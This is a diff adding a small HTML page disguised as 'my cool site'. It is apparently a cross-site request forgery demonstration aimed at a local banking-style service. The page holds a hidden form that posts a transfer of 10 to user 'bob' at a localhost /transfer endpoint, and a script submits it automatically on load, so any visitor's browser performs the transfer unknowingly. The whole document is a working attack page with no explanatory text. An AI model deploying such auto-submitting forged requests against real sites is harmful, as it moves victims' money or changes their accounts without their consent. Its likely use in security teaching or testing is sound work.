@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+    <title>my cool site</title>
+    <form method='POST' action='http://localhost:8080/transfer' style='display: none;'>
+        Send amount:
+        <input name='amount' value='10'/>
+        To user:
+        <input name='to' value='bob'/> 
+        <input type='submit' value='Send' />
+    </form>
+    <script>
+        document.forms[0].submit()
+    </script>
+</html>
